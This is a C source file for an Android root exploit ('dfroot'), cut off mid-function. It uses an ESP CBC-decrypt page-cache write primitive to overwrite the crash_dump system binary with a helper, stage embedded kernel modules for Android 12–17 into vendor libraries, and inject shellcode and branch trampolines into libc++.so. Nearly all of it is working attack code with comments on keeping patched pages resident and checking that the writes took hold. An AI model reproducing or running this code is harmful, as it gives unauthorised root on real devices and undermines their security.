#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "aes256.h"

#define eos(s) (s + strlen(s))

#if defined(__arm__)
/* arm32 userspace (arm64 kernel): every file we patch lives in the 32-bit
 * namespace, and the SELinux bridge is crash_dump32. The kernel module and the
 * hook target's bitness stay tied to the kernel/userspace build respectively. */
#define DF_TARGET32 1
static const char kCrashDump[]  = "/apex/com.android.runtime/bin/crash_dump32";
static const char kLibcxxPath[] = "/system/lib/libc++.so";
#else
#define DF_TARGET32 0
static const char kCrashDump[]  = "/apex/com.android.runtime/bin/crash_dump64";
static const char kLibcxxPath[] = "/system/lib64/libc++.so";
#endif
static char    *libcxx_ko_target;

static int      g_encap_port;
static int      g_sender_port;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint32_t g_seq = 1;
struct PatchRestore {
    const char *lib;
    uint64_t    tramp_aligned;
    uint8_t     tramp_orig[32];
    int         tramp_len;
    uint64_t    shell_off;
    uint32_t    shell_padded;
    char        shell_orig[1024];
    int         valid;
};

static struct PatchRestore g_libcxx_r;

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* ---- keep the patched bridge resident ------------------------------------
 * The bytes we write into the page cache are NOT marked dirty: the ESP decrypt
 * writes into the page through kmap, so neither the inode nor the page table
 * knows it was modified and the kernel treats the pages as clean. Under memory
 * pressure they are reclaimed, the file is re-read from disk and the stock
 * crash_dump32 comes back - observed as e_type=3 mid-run, right after ~74
 * successful blocks, and as "helper exited 0 but wrote nothing".
 *
 * Holding a splice() reference to the page bumps its refcount, which takes it
 * off the LRU so the reclaim path cannot touch it. A second safety net is
 * bridge_is_ours(): if the page does get evicted we simply re-patch.
 */
static void *g_pin_map = NULL;

/* Soft pin: map the page read-only and fault it in, then keep the mapping.
 * A pipe-based pin (splice one byte of the page into a pipe) keeps the page
 * around too, but it also turns the page into a spliceable pipe page - and the
 * ESP primitive writes in place into pages referenced by pipe buffers, which
 * SEGV'd the helper mid-exec (status 0xb = killed by signal 11). A plain
 * read-only mapping keeps the page referenced without exposing it that way. */
static void pin_bridge(void)
{
    int fd = open(kCrashDump, O_RDONLY);
    if (fd < 0) { printf("pin: open %s failed\n", kCrashDump); return; }
    if (!g_pin_map) {
        void *m = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
        if (m == MAP_FAILED) { printf("pin: mmap failed: %s\n", strerror(errno)); close(fd); return; }
        g_pin_map = m;
    }
    volatile unsigned char c = ((volatile unsigned char *)g_pin_map)[0];
    (void)c;
    printf("pin: %s page0 mapped read-only\n", kCrashDump);
    close(fd);
}

/* Our splicehelper is a static ET_EXEC (e_type 2); the stock crash_dump32 is a
 * PIE (e_type 3). */
static int bridge_is_ours(void)
{
    int fd = open(kCrashDump, O_RDONLY);
    if (fd < 0) return 0;
    unsigned char b[20] = {0};
    ssize_t n = pread(fd, b, sizeof(b), 0);
    close(fd);
    return n == (ssize_t)sizeof(b) && b[16] == 2 && b[17] == 0;
}

/* fork + exec the crash_dump bridge (splicehelper); dup2 write_fd onto target_fd.
 * Pass mode="r" for read, NULL for write-splice.
 * Returns waitpid status, or -1 if fork fails (already logged).
 *
 * This used to be clone(CLONE_VFORK|CLONE_VM, stack=0), i.e. the child ran on the
 * parent's own stack. On arm32 the child then clobbered the caller's frame: the
 * file offset handed to the next call came back as garbage (0x102c2a6a instead
 * of 0), so the bridge spliced past EOF and exited 1. Plain fork() gives the
 * child its own address space and is equally correct.
 */
static int spawn_crash_dump(off64_t offset, int write_fd, int target_fd, const char *mode)
{
    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%lld", (long long)offset);

    int pid = fork();
    if (pid < 0) { printf("fork failed: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(9);
        if (mode)
            execl(kCrashDump, "crashdump", offstr, libcxx_ko_target, mode, NULL);
        else
            execl(kCrashDump, "crashdump", offstr, libcxx_ko_target, NULL);
        _exit(9);
    }
    int st = 0;
    int wr = (int)TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
    if (wr != pid)
        printf("bridge waitpid ret=%d errno=%d pid=%d (status stale!)\n", wr, errno, pid);
    if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0))
        printf("bridge(%s) off=%s status=0x%x\n", mode ? mode : "splice", offstr, st);
    return st;
}

static int g_pin_pid = -1;
static int g_pin_fd  = -1;

/* Keep the staged module's pages pinned for the whole run: the bridge splices
 * the file into a pipe it never drains, then sleeps. Pipe buffers hold page
 * references, so reclaim cannot touch them - unlike an mmap, which this device
 * happily unmaps over time. */
static int spawn_pin_daemon(void)
{
    if (g_pin_pid > 0) return 0;
    int p[2];
    if (pipe(p) < 0) { printf("pin: pipe failed: %s\n", strerror(errno)); return -1; }
    int pid = fork();
    if (pid < 0) { close(p[0]); close(p[1]); printf("pin: fork failed\n"); return -1; }
    if (pid == 0) {
        int nul = open("/dev/null", O_WRONLY);
        if (nul >= 0) { dup2(nul, 2); close(nul); }   /* keep fd 1 as the pipe */
        if (p[1] != 1) dup2(p[1], 1);
        execl(kCrashDump, "pin", "0", libcxx_ko_target, "P", NULL);
        _exit(9);
    }
    close(p[1]);
    g_pin_fd  = p[0];
    g_pin_pid = pid;
    printf("pin: staging pages held by bridge pid %d\n", pid);
    return 0;
}

/* Ask the bridge for the size of a file it can open but we cannot stat. */
static int probe_file_size(const char *path, uint64_t *out)
{
    (void)path;
    int rdpipe[2];
    if (pipe(rdpipe) < 0) return -1;
    int status = spawn_crash_dump(0, rdpipe[1], 0, "s");
    close(rdpipe[1]);
    unsigned char b[8] = {0};
    int n = 0;
    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], b, 8));
    close(rdpipe[0]);
    if (n != 8) return -1;
    uint64_t v = 0;
    for (int i = 0; i < 8; i++) v |= (uint64_t)b[i] << (8 * i);
    *out = v;
    return 0;
}

/* Pick a staging file the kernel module actually fits into. The vendor files
 * cannot be stat()ed from untrusted_app, so every candidate is probed through
 * the bridge. Returns 0 and leaves libcxx_ko_target pointing at a file that is
 * >= need bytes long. */
static int try_ko_targets(size_t need)
{
#if DF_TARGET32
    static const char *const cand[] = {
        "/vendor/lib/libbinderdebug.so",
        "/vendor/lib/libstagefrighthw.so",
        "/vendor/lib/libstagefright_aidl_bufferpool2.so",
    };
#else
    static const char *const cand[] = {
        "/vendor/lib64/libbinderdebug.so",
        "/vendor/lib64/libstagefrighthw.so",
        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
    };
#endif
    size_t n = sizeof(cand) / sizeof(cand[0]);

    for (size_t i = 0; i < n; i++) {
        strncpy(libcxx_ko_target, cand[i], 63);
        libcxx_ko_target[63] = '\0';
        uint64_t sz = 0;
        if (probe_file_size(cand[i], &sz) != 0) {
            printf("staging probe %s: unreadable\n", cand[i]);
            continue;
        }
        printf("staging probe %s: %llu bytes (need %zu)\n",
               cand[i], (unsigned long long)sz, need);
        if (sz >= need) return 0;
    }

    strncpy(libcxx_ko_target, cand[0], 63);
    libcxx_ko_target[63] = '\0';
    return -1;
}

static int read_vendor_content(off64_t offset, uint8_t buf[16]);

/* Read every 16-byte block of a staged range back and compare it with what we
 * wrote. The patched page cache is clean, so the kernel may reclaim it at any
 * moment: a half-reclaimed module makes insmod fail with no visible reason.
 * Returns 0 when the whole range still matches. */
static int verify_range(const char *path, const char *payload, size_t len,
                        size_t foff, int use_helper)
{
    for (size_t i = 0; i < len / 16; i++) {
        off64_t off = (off64_t)(foff + i * 16);
        uint8_t cur[16] = {0};
        if (use_helper) {
            int rv = -1;
            for (int t = 0; t < 2 && rv < 0; t++) rv = read_vendor_content(off, cur);
            if (rv < 0) return -1;
        } else {
            int fd = open(path, O_RDONLY);
            if (fd < 0) return -1;
            ssize_t n = pread64(fd, cur, 16, off);
            close(fd);
            if (n != 16) return -1;
        }
        if (memcmp(cur, payload + i * 16, 16) != 0) {
            printf("block 0x%08lx%08lx reverted\n",
                   (unsigned long)((uint64_t)off >> 32),
                   (unsigned long)((uint64_t)off & 0xffffffffu));
            return -2;
        }
    }
    return 0;
}

/* ELF identity of whatever is currently sitting in the bridge's page cache.
 * Our splicehelper is a static ET_EXEC (e_type 2); the stock crash_dump32 is a
 * PIE (e_type 3). If the page cache got evicted and re-read from disk, the
 * exploit would silently be exec'ing the original binary. */
static void dump_bridge_ident(void)
{
    int fd = open(kCrashDump, O_RDONLY);
    if (fd < 0) { printf("bridge ident: cannot open %s\n", kCrashDump); return; }
    unsigned char b[20] = {0};
    ssize_t n = pread(fd, b, sizeof(b), 0);
    close(fd);
    if (n != (ssize_t)sizeof(b)) { printf("bridge ident: short read %zd\n", n); return; }
    unsigned e_type = (unsigned)b[16] | ((unsigned)b[17] << 8);
    printf("bridge ident: e_type=%u (%s) magic=%02x%02x%02x\n", e_type,
           e_type == 2 ? "our helper" : e_type == 3 ? "STOCK crash_dump - page cache reverted!" : "?",
           b[1], b[2], b[3]);
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 */
static int read_vendor_content(off64_t offset, uint8_t buf[16]) {
    off64_t off0 = offset;
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }
    int rd0 = rdpipe[0], rd1 = rdpipe[1];

    int status = spawn_crash_dump(offset, rdpipe[1], 0, "r");
    close(rdpipe[1]);
    int n = 0, rerr = 0;
    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        errno = 0;
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
        rerr = errno;
    }
    close(rdpipe[0]);
    if (status < 0) return -1;
    if (n != 16) {
        if (WIFEXITED(status)) {
            static const char *const exit_meanings[] = {
                [0] = "success",
                [1] = "open vendor file failed or read returned < 16 bytes",
                [2] = "write to pipe returned < 16 bytes",
                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
                [4] = "open of the vendor file failed (SELinux?)",
                [9] = "bridge could not exec (dup2/execl failed)",
            };
            int ec = WEXITSTATUS(status);
            const char *meaning = (ec <= 4 || ec == 9) ? exit_meanings[ec] : "unknown";
            printf("read_vendor at 0x%llx got %d bytes: %s (pipe %d/%d errno %d)\n",
                     (long long)off0, n, meaning, rd0, rd1, rerr);
        } else if (WIFSIGNALED(status))
            printf("read_vendor at 0x%llx got %d bytes: signal %d\n",
                     (long long)offset, n, WTERMSIG(status));
        else
            printf("read_vendor at 0x%llx got %d bytes: status 0x%x\n",
                     (long long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC write.
 * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
 * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
 * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
 */
static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off64_t offset,
                            const uint8_t iv[16], int use_helper) {
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(g_seq++);
    memcpy(hdr + 8, iv, 16);

    struct iovec iov = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
        printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
    }

    if (use_helper) {
        int st = spawn_crash_dump(offset, pipe_wr, 1, NULL);
        if (st < 0) return -1;
        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            printf("splice helper failed status=0x%x\n", st);
            return -1;
        }
    } else {
        /* splice() hands the kernel a loff_t*: it MUST be 8 bytes wide, even
         * on arm32 where off_t is only 4. A 32-bit off_t here makes the
         * kernel read stack garbage as the upper half -> EINVAL. */
        off64_t off = offset;
        if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
            printf("splice file failed: %s\n", strerror(errno)); return -1;
        }
    }

    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
    return 0;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * For system files (use_helper=0): reads old_content with pread().
 * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
 * len must be a multiple of 16.
 */
static int patch_helper(void);

static int patch_file_cbc(const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper) {
    if (len % 16 != 0) {
        printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { printf("socket failed: %s\n", strerror(errno)); return -1; }
    int opt = 1;
    setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in src = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_sender_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_encap_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        printf("connect failed: %s\n", strerror(errno));
        close(sk_send); return -1;
    }

    int file_fd = -1;
    if (!use_helper) {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            printf("open %s failed: %s\n", path, strerror(errno));
            close(sk_send); return -1;
        }
    }

    int pfd[2];
    if (pipe(pfd) < 0) {
        printf("pipe failed: %s\n", strerror(errno));
        if (!use_helper) close(file_fd);
        close(sk_send);
        return -1;
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off64_t off = (off64_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (use_helper && !bridge_is_ours()) {
            printf("bridge reverted at 0x%08lx%08lx, re-patching\n",
                   (unsigned long)((uint64_t)off >> 32),
                   (unsigned long)((uint64_t)off & 0xffffffffu));
            if (patch_helper() != 0) { rc = -1; break; }
            pin_bridge();
        }
        if (use_helper) {
            int rv = -1;
            for (int t = 0; t < 4 && rv < 0; t++) {
                if (t) {
                    if (!bridge_is_ours()) {
                        printf("bridge was evicted, re-patching\n");
                        if (patch_helper() != 0) break;
                        pin_bridge();
                    } else {
                        printf("read_vendor retry %d\n", t);
                        usleep(2000);
                    }
                }
                rv = read_vendor_content(off, old_content);
            }
            if (rv < 0) {
                dump_bridge_ident();
                rc = -1; break;
            }
        } else {
            if (pread64(file_fd, old_content, 16, off) != 16) {
                printf("pread at 0x%llx failed: %s\n", (long long)off, strerror(errno));
                rc = -1; break;
            }
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
            printf("write #%zu at 0x%08lx%08lx failed\n", i,
                   (unsigned long)((uint64_t)off >> 32),
                   (unsigned long)((uint64_t)off & 0xffffffffu));
            rc = -1; break;
        }

        if (i == 0) {
            /* Did the primitive actually change what a later read sees? */
            uint8_t chk[16] = {0};
            int got = 0;
            if (use_helper) {
                got = (read_vendor_content(off, chk) == 0);
            } else {
                int vf = open(path, O_RDONLY);
                if (vf >= 0) { got = pread64(vf, chk, 16, off) == 16; close(vf); }
            }
            printf("verify @0x%08lx%08lx: %s\n",
                   (unsigned long)((uint64_t)off >> 32),
                   (unsigned long)((uint64_t)off & 0xffffffffu),
                   !got ? "read failed" : (memcmp(chk, desired, 16) == 0 ? "OK" : "MISMATCH"));
        }
    }

    close(pfd[0]); close(pfd[1]);
    if (!use_helper) close(file_fd);
    close(sk_send);
    if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
    return rc;
}

/* ---- KO and splicehelper blobs ---- */

/* The module actually selected for this device, kept so that it can be
 * re-verified (and re-patched) right before we trigger the hook. */
static const char *g_ko_data;
static size_t      g_ko_len;

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;

asm(
    ".section .rodata\n"
    ".global dfroot_ko_12_5_10_start\n.global dfroot_ko_12_5_10_end\n"
    "dfroot_ko_12_5_10_start:\n.incbin \"ko/dfroot-android12-5.10.ko\"\ndfroot_ko_12_5_10_end:\n"
    ".global dfroot_ko_13_5_10_start\n.global dfroot_ko_13_5_10_end\n"
    "dfroot_ko_13_5_10_start:\n.incbin \"ko/dfroot-android13-5.10.ko\"\ndfroot_ko_13_5_10_end:\n"
    ".global dfroot_ko_13_5_15_start\n.global dfroot_ko_13_5_15_end\n"
    "dfroot_ko_13_5_15_start:\n.incbin \"ko/dfroot-android13-5.15.ko\"\ndfroot_ko_13_5_15_end:\n"
    ".global dfroot_ko_14_5_15_start\n.global dfroot_ko_14_5_15_end\n"
    "dfroot_ko_14_5_15_start:\n.incbin \"ko/dfroot-android14-5.15.ko\"\ndfroot_ko_14_5_15_end:\n"
    ".global dfroot_ko_14_6_1_start\n.global dfroot_ko_14_6_1_end\n"
    "dfroot_ko_14_6_1_start:\n.incbin \"ko/dfroot-android14-6.1.ko\"\ndfroot_ko_14_6_1_end:\n"
    ".global dfroot_ko_15_6_6_start\n.global dfroot_ko_15_6_6_end\n"
    "dfroot_ko_15_6_6_start:\n.incbin \"ko/dfroot-android15-6.6.ko\"\ndfroot_ko_15_6_6_end:\n"
    ".global dfroot_ko_16_6_12_start\n.global dfroot_ko_16_6_12_end\n"
    "dfroot_ko_16_6_12_start:\n.incbin \"ko/dfroot-android16-6.12.ko\"\ndfroot_ko_16_6_12_end:\n"
    ".global dfroot_ko_17_6_18_start\n.global dfroot_ko_17_6_18_end\n"
    "dfroot_ko_17_6_18_start:\n.incbin \"ko/dfroot-android17-6.18.ko\"\ndfroot_ko_17_6_18_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dfroot_ko_12_5_10_start[], dfroot_ko_12_5_10_end[];
extern char dfroot_ko_13_5_10_start[], dfroot_ko_13_5_10_end[];
extern char dfroot_ko_13_5_15_start[], dfroot_ko_13_5_15_end[];
extern char dfroot_ko_14_5_15_start[], dfroot_ko_14_5_15_end[];
extern char dfroot_ko_14_6_1_start[],  dfroot_ko_14_6_1_end[];
extern char dfroot_ko_15_6_6_start[],  dfroot_ko_15_6_6_end[];
extern char dfroot_ko_16_6_12_start[], dfroot_ko_16_6_12_end[];
extern char dfroot_ko_17_6_18_start[], dfroot_ko_17_6_18_end[];
extern char splice_helper_start[], splice_helper_end[];

struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };

static const struct KoImage *select_ko_image(int andr, int major, int minor) {
    static const struct KoImage imgs[] = {
        {12, 5, 10, dfroot_ko_12_5_10_start, dfroot_ko_12_5_10_end},
        {13, 5, 10, dfroot_ko_13_5_10_start, dfroot_ko_13_5_10_end},
        {13, 5, 15, dfroot_ko_13_5_15_start, dfroot_ko_13_5_15_end},
        {14, 5, 15, dfroot_ko_14_5_15_start, dfroot_ko_14_5_15_end},
        {14, 6,  1, dfroot_ko_14_6_1_start,  dfroot_ko_14_6_1_end},
        {15, 6,  6, dfroot_ko_15_6_6_start,  dfroot_ko_15_6_6_end},
        {16, 6, 12, dfroot_ko_16_6_12_start, dfroot_ko_16_6_12_end},
        {17, 6, 18, dfroot_ko_17_6_18_start, dfroot_ko_17_6_18_end},
    };
    const struct KoImage *fb = NULL;
    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
        if (imgs[i].android_release == andr) return &imgs[i];
        if (!fb) fb = &imgs[i];
    }
    return fb;
}

static int read_device_versions(int *andr, int *major, int *minor) {
    struct utsname u;
    if (uname(&u) != 0) return -1;
    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
    const char *m = strstr(u.release, "android");
    if (!m) {
        printf("uname -r is missing Android version, trying getprop\n");

        char vendor_ver[5];
        char release[15];

        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
        fgets(vendor_ver, sizeof(vendor_ver), f);
        pclose(f);

        sprintf(release, "android");
        sprintf(eos(release), "%s", vendor_ver);

        m = release;
    }
    *andr = atoi(m + 7);
    return (*andr > 0) ? 0 : -1;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}

/* Write splicehelper into crash_dump64 page cache. */
static int patch_helper(void) {
    size_t len;
    char *buf = pad16(splice_helper_start,
                      (size_t)(splice_helper_end - splice_helper_start), &len);
    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
    printf("patch: %s <- splicehelper (%zu bytes)\n", kCrashDump, len);
    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }

    pin_bridge();

    uint8_t verify[16];
    int vfd = open(kCrashDump, O_RDONLY);
    if (vfd >= 0) {
        ssize_t n = pread(vfd, verify, 16, 16);
        close(vfd);
        if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
            printf("patch: %s verification failed\n", kCrashDump);
            printf("patch: DEVICE NOT VULNERABLE\n");
            free(buf);
            return -1;
        }
    }
    free(buf);
    return 0;
}

static int patch_ko(void) {
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        printf("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
    }
    const struct KoImage *ko = select_ko_image(andr, major, minor);
    if (!ko) {
        printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
    }
    printf("Using KMI: android%d-%d.%d\n",
             ko->android_release, ko->kver_major, ko->kver_minor);

    size_t len;
    char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }

    if (try_ko_targets(len) != 0) {
        printf("no staging file is large enough for a %zu byte module\n", len);
        free(buf);
        return -1;
    }

    g_ko_data = buf;
    g_ko_len  = len;

    /* Pin the pages first: they must never be reclaimed while we patch them,
     * and the pin has to be in place before the first write lands. */
    spawn_pin_daemon();

    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
    /* deliberately not freed: g_ko_data is re-checked at pre-load time */
    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
    return ret;
}

static void cleanup(void) {
    if (g_pin_pid > 0) { kill(g_pin_pid, SIGKILL); g_pin_pid = -1; }
    if (!g_libcxx_r.valid) return;
    printf("\n=== cleanup ===\n");
    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, (size_t)g_libcxx_r.tramp_len,
                   (size_t)g_libcxx_r.tramp_aligned, 0);
    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
                   (size_t)g_libcxx_r.shell_off, 0);
}

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     size_t shellcode_size, int *thumb);

/* ---- branch encoders ---- */

#if !DF_TARGET32
static uint32_t branch_a64(uint64_t from, uint64_t to)
{
    int64_t off = (int64_t)to - (int64_t)from;
    if ((off & 3) || off < -(1LL << 27) || off >= (1LL << 27)) return 0;
    return 0x14000000u | (((uint32_t)(off >> 2)) & 0x03FFFFFDu);
}
#else
/* ARMv7 B.W (T4): offset relative to insn+4 */
static uint32_t branch_thumb(uint32_t from, uint32_t to)
{
    int32_t off = (int32_t)(to - (from + 4));
    if (off & 1) return 0;
    if (off < -(1 << 24) || off >= (1 << 24)) return 0;
    uint32_t S = ((uint32_t)off >> 24) & 1;
    uint32_t I1 = ((uint32_t)off >> 23) & 1;
    uint32_t I2 = ((uint32_t)off >> 22) & 1;
    uint32_t imm10 = ((uint32_t)off >> 12) & 0x3FF;
    uint32_t imm11 = ((uint32_t)off >> 1) & 0x7FF;
    uint32_t J1 = (~(I1 ^ S)) & 1;
    uint32_t J2 = (~(I2 ^ S)) & 1;
    uint32_t hw1 = 0xF000 | (S << 10) | imm10;
    uint32_t hw2 = 0x9000 | (J1 << 13) | (J2 << 11) | imm11;
    return hw1 | (hw2 << 16);          /* little-endian halfword pair */
}

/* ARM (A32) B: offset relative to insn+8 */
static uint32_t branch_arm(uint32_t from, uint32_t to)
{
    int32_t off = (int32_t)(to - (from + 8));
    if ((off & 3) || off < -(1 << 25) || off >= (1 << 25)) return 0;
    return 0xEA000000u | (((uint32_t)off >> 2) & 0x00FFFFFFu);
}

/* Length of a Thumb-2 instruction in bytes, from its first halfword. */
static int thumb_insn_len(uint32_t insn)
{
    unsigned top = (unsigned)((insn & 0xFFFFu) >> 11);
    return (top == 0x1Du || top == 0x1Eu || top == 0x1Fu) ? 4 : 2;
}
#endif

static uint32_t mk_branch(uint64_t from, uint64_t to, int thumb)
{
#if DF_TARGET32
    return thumb ? branch_thumb((uint32_t)from, (uint32_t)to)
                 : branch_arm((uint32_t)from, (uint32_t)to);
#else
    (void)thumb;
    return branch_a64(from, to);
#endif
}

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy, struct PatchRestore *restore)
{
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }

    if (padded > sizeof(restore->shell_orig)) {
        printf("shellcode too large to save (%zu)\n", padded);
        free(buf); return -1;
    }

    uint64_t hook_off, shell_off; uint32_t first_insn; int thumb = 0;
    printf("Finding symbol offsets for %s:\n", lib);
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded, &thumb)) {
        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
    }
    printf("Found: hook=0x%lx shellcode=0x%lx len=%u%s\n",
           (unsigned long)hook_off, (unsigned long)shell_off, stage_len,
           thumb ? " (thumb)" : "");

    /* The trampoline must cover a whole instruction: 4 bytes on both AArch64
     * and Thumb-2. A 16-bit Thumb site is rejected by elf_parser already. */
    int insn_len = 4;
#if DF_TARGET32
    if (thumb && thumb_insn_len(first_insn) != 4) insn_len = 2;
#endif

    uint32_t hook_insn = mk_branch(hook_off, shell_off + start_delta, thumb);
    if (!hook_insn) {
        printf("patch: %s - hook branch out of range\n", lib);
        free(buf); return -1;
    }

    if (first_insn == hook_insn) {
        printf("%s already patched\n", lib); free(buf); return 0;
    }

    uint32_t jmpback = mk_branch(shell_off + stage_len - 4, hook_off + insn_len, thumb);
    if (!jmpback) {
        printf("patch: %s - jump-back branch out of range\n", lib);
        free(buf); return -1;
    }
    *(uint32_t *)&buf[stage_len - 4] = jmpback;
    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;

    /* The trampoline may straddle a 16-byte CBC block; then patch the aligned
     * 32-byte pair so both blocks are computed from one consistent old state. */
    uint64_t aligned = hook_off & ~(uint64_t)15;
    int pos = (int)(hook_off & 15);
    int blk_len = (pos + 4 > 16) ? 32 : 16;

    int fd = open(lib, O_RDONLY);
    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
    int ok = pread64(fd, restore->shell_orig, padded,  (off64_t)shell_off) == (ssize_t)padded
          && pread64(fd, restore->tramp_orig, blk_len, (off64_t)aligned)  == (ssize_t)blk_len;
    close(fd);
    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }

    restore->lib           = lib;
    restore->shell_off     = shell_off;
    restore->shell_padded  = (uint32_t)padded;
    restore->tramp_aligned = aligned;
    restore->tramp_len     = blk_len;
    restore->valid         = 1;

    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
    free(buf);
    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }

    uint8_t blk[32];
    memcpy(blk, restore->tramp_orig, (size_t)blk_len);
